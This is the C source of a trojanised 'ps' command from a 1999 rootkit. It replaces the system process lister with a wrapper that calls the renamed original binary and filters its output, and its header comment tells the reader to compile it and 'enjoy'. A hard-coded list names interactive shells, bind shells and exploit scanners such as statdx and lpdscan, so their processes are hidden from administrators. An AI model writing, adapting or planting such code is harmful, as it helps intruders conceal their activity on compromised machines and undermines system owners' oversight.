/*
* fake_ps.c
* Set the path to original ps, set the environment to withdraw,
* compile, resize and enjoy.
*
* Note: Never give PS more than 15 bytes of path
* funny things will happen if you exceed this limit.
*
* Author: telar (telar@mail.com) 21/12 - 1999
*/
#include <stdio.h>
#include <string.h>
 
#define PR "adore" /* Name of hidden ps */
#define PS "/usr/bin/adore" /* full path */
#define ERR "/tmp/.problem" /* error handling */
#define TMP "/tmp/.tmp" /* temporary file */
#define nr 24 /* no. lines in lns */
#define OFFSET 100 /* for a safer world */
 
char *lns[nr] = { /* fill in what you'd- */
"/bin/sh -i", /* like to be removed */
"xargs",
".bla",
"cat",
"./pscan",
"tail",
"sh ./",
"./bind",
"xargs -l -P",
"sh -c",
"pscan-bind",
"sleep",
"bindscan",
"statdx",
"lpd",
"lpdscan",
"lpd-scan",
"statdxscan",
"lprngscan",
"randb",
"pscan-lprng",
"pscan-statdx",
"wuscan",
"lpd7.sh",
};
 
char *s;
int i,c,k;
FILE *ep,*op;
char bufa[12024];
char bufb[12024];
char bufc[12024];
 
int check(char *b)
{
for(i=0;i<nr;i++) {
if((s=strstr(b,lns[i]))!=NULL) {
return(-1);
}
}
return(0);
}
 
 
int fixps(int z)
{
while(fgets(bufc,z+OFFSET,ep)) {
if(!(s=strstr(bufc,PS))) {
if(!(s=strstr(bufc,PR))) {
if(!(check(bufc))) {
printf("%s",bufc); }
 
}
}
}
return;
}
 
main(int argc, char *argv[])
{
 
ep=fopen(TMP,"w");
fputs("\n",ep);
if (argc>1) {
strcat(bufa,PS);
strcat(bufb,"");
for(i=1;i<argc;i++) {
strcat(bufb," ");
strcat(bufa," ");
strcat(bufb,argv[i]);
strcat(bufa,argv[i]);
}
}
if (argc<=1) {
strcat(bufa,PS);
strcat(bufb,""); }
fclose(ep);
strcat(bufa," >> ");
strcat(bufa,TMP);
system(bufa);
 
if ((ep=fopen(TMP,"r"))==NULL) {
op=fopen(ERR,"a");
fprintf(op,"\nProblem occured, trojan dumped:\n%s execved by %s
doing %s",PS,getlogin(),bufb);
fclose(op);
execv(PS,bufb);
exit(0);
}
 
while ((c=fgetc(ep))!='\n') {
k++; }
 
fixps(k);
fclose(ep);
remove(TMP);
}
 
